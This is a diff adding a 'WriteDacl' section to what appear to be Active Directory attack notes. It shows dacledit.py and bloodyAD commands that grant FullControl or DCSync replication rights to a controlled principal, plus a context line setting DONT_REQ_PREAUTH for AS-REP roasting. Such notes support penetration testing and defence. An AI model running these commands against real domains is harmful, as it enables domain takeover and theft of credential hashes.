@@ -32,6 +32,33 @@ We can also add the dont_req_preauth setting so that the account is ASREProastab
 bloodyAD --host <dc_controller_name> -d "domain_name" --dc-ip <domain_controller_ip> -k add uac <username_of_target_account> -f DONT_REQ_PREAUTH
 ```
 
+### WriteDacl
+
+This abuse can be carried out when controlling an object that has WriteDacl over another object.
+
+Instead of giving full control, the same process can be applied to allow an object to DCSync by adding two ACEs with specific Extended Rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). Giving full control leads to the same thing since GenericAll includes all ExtendedRights, hence the two extended rights needed for DCSync to work.
+
+Using dacledit.py
+
+```
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
+```
+
+```
+dacledit.py -action 'write' -rights 'DCSync' -principal 'controlled_object' -target 'target_object' "$DOMAIN"/"$USER":"$PASSWORD"
+```
+
+Using bloodyAd
+
+```
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TargetObject" "$ControlledPrincipal"
+```
+
+```
+# Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$ControlledPrincipal"
+```
+
 ### WriteOwner
 
     Abuse with bloodyAD
